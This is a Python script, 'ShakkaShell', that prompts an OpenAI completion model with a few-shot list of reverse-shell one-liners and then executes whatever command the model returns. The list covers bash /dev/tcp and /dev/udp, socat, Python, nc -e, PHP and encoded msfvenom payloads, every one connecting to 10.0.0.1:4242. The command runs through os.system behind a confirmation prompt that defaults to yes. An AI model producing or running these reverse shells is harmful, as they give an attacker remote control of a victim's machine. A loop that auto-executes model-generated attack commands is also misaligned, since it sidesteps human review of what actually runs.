prompt = """
    I am a highly intelligent Cyber Security Bot and I can give you a simple command snippet in Various Languages for your task. My code is properly indented . I print only  one line of code per line . I  don't use comments .
    Q: I need Bash reverse shell 10.0.0.1 port 4242
    A:bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #ShakkaShell Powered By OpenAI

   Q: Give me UDP Bash reverse Shell 10.0.0.1 port 4242
   A: sh -i >& /dev/udp/10.0.0.1/4242 0>&1  #ShakkaShell Powered By OpenAI

   Q: I need SoCat Reverseshell 10.0.0.1 port 4242
   A: /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 #ShakkaShell Powered By OpenAI

   Q: I need a Python Reverse shell 10.0.0.1 port 4242
   A: export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' #ShakkaShell Powered By OpenAI

   Q: I need a nc reverse shell 10.0.0.1 port 4242?
   A: nc -e /bin/sh 10.0.0.1 4242 #ShakkaShell Powered By OpenAI

   Q: I need a reverse shell in php 10.0.0.1 port 4242? 
   A: php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");' #ShakkaShell Powered By OpenAI

   Q: I need a window reverse shell in msfvenom 10.0.0.1 port 4242? 
   A: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > shell.exe #ShakkaShell Powered By OpenAI

   Q: I need a freebsd reverse shell in msfvenom 10.0.0.1 port 4242? 
   A: msfvenom -p freebsd/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > shell.exe #ShakkaShell Powered By OpenAI

   Q: I need a python reverse shell in msfvenom 10.0.0.1 port 187 remove bad charactors 0x.
   A: msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=187 -e x86/shikata_ga_nai -i 3 -f exe > shell.exe #ShakkaShell Powered By OpenAI
"""

template = """
    Q: {}
    A:
"""
import getpass 

print("__________________________________________________")
print("\nWelcome to ShakkaShell\n__________________________________________________")

p = getpass.getpass(prompt = '\nPlease enter your OpenAI API Secret Key (Input hidden):') 

import os, click, openai
os.environ['OPENAI_API_KEY'] = p
openai.api_key = os.environ["OPENAI_API_KEY"]

while True:
    request = input(click.style('ShakkaShell> ', 'red', bold=True))
    prompt += template.format(request)
    result = openai.Completion.create(
        engine='davinci', prompt=prompt, stop=["\n\n"], max_tokens=200, temperature=.01
    )

    command = result.choices[0]['text']

    if click.confirm(f'>>> Run: {click.style(command, "blue")}', default=True):
        os.system(command)